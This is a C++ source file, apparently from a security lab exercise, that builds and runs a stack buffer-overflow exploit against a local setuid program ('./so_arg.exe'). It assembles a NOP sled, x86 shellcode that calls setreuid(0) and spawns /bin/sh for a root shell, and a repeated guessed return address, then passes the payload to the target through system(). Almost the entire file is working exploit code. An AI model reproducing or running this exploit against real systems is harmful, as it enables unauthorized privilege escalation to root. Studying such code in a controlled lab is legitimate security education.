#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <string>

using namespace std;

/*
return address is calculated based-on the exploit code's stack variable address
however, need to do a guessing work on finding the right offset to find the target
program's caller's return address relative to the buffer

Steps:
find the payload size needed to overwrite the return address
    - buffer's address is automatically calculated
creat payload: [NOP sled | shellcode | repeated return address]
launch target program with the payload: system("./targetProgram payload")
*/
   
string shellcode = 
     // root shell; that escalates the priviledge for exploiting setuid program
     "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
     "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
     "\xe1\xcd\x80";
     
     // regular shell
     /*
     "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
     "\xc9\x89\xca\x6a\x0b\x58\xcd\x80";
     */

int main(int argc, char *argv[]) {
    // address of ref_var is used as the point of reference to determine offset
    size_t ref_var, ret_address, offset;
    size_t payload_len;
    char *ptr, *payload;

    //=================FIXME
    string command = "./so_arg.exe \"";
    //=================
    
    if(argc == 2) // set offset
        offset = atoi(argv[1]);
    else
        offset = 100; // FIXME, if offset is determined

    // create payload
    // | NOP sled | shellcode | repeated return address |

    //==================FIXME
    payload_len = 144; // the actual offset of caller's return address withrespect to buffer
    size_t ret_address_count = 5; // you can increase or decrease this based on payload_len
    //==================

    payload = new char[payload_len];
    ptr = payload;

    size_t NOP_sled_len = payload_len - shellcode.length() - (4*ret_address_count);
    memset(ptr, 0x90, NOP_sled_len); // build NOP sled
    ptr += NOP_sled_len;

    // copy shellcode
    memcpy(ptr, shellcode.c_str(), shellcode.length());
    ptr += shellcode.length();

    ret_address = (unsigned int) &ref_var - offset; // set return address
    for(int i=0; i<(ret_address_count*4); i+=4) // fill ptr with return address
        *((unsigned int *)(ptr+i)) = ret_address;
    //printf("ref_var at %p\n", &ref_var);
    //printf("ret add = %p\n", ret_address);
    command += string(payload) + "\"";
    // cout << command;
    system(command.c_str()); // run exploit
    delete [] payload;
}

